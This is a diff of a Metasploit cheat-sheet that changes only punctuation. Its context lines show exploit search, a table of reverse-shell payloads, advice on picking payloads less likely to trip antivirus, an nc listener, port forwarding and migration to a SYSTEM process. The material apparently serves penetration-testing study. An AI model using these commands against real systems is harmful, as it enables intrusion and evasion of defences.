@@ -9,7 +9,7 @@ The goal of this reference is to cover the commands needed to use Metasploit eff
 ```sh
 # Start
 msfconsole
-msfconsole -q    # quiet — no banner
+msfconsole -q    # quiet - no banner
 
 # Search for an exploit
 search ms17-010
@@ -47,13 +47,13 @@ sessions -i 1    # interact with session 1
 
 ---
 
-## Payloads — Know the Difference
+## Payloads - Know the Difference
 
 | Payload | What it gives you |
 |---|---|
 | `windows/shell_reverse_tcp` | Basic cmd.exe shell |
 | `windows/x64/shell_reverse_tcp` | 64-bit basic shell |
-| `windows/meterpreter/reverse_tcp` | Meterpreter — feature-rich |
+| `windows/meterpreter/reverse_tcp` | Meterpreter - feature-rich |
 | `linux/x64/shell_reverse_tcp` | Linux basic shell |
 
 **Rule of thumb:** Use `shell_reverse_tcp` (not meterpreter) unless you specifically need Meterpreter features. Meterpreter is more likely to trigger AV.
@@ -72,7 +72,7 @@ set LPORT 4444
 run
 ```
 
-> For basic `nc -e` shells, just use `nc -lvnp 4444` — no need for multi/handler.
+> For basic `nc -e` shells, just use `nc -lvnp 4444` - no need for multi/handler.
 
 ---
 
@@ -108,14 +108,14 @@ portfwd add -l 3389 -p 3389 -r <internal-ip>    # port forward
 
 # Process migration (for stability or privilege)
 ps                    # list processes
-migrate <PID>         # migrate to another process — pick SYSTEM process
+migrate <PID>         # migrate to another process - pick SYSTEM process
 ```
 
 ---
 
 ## msfvenom (Generating Payloads)
 
-Use this even when NOT using Metasploit — standalone payloads work with nc listener.
+Use this even when NOT using Metasploit - standalone payloads work with nc listener.
 
 ```sh
 # Windows reverse shell EXE
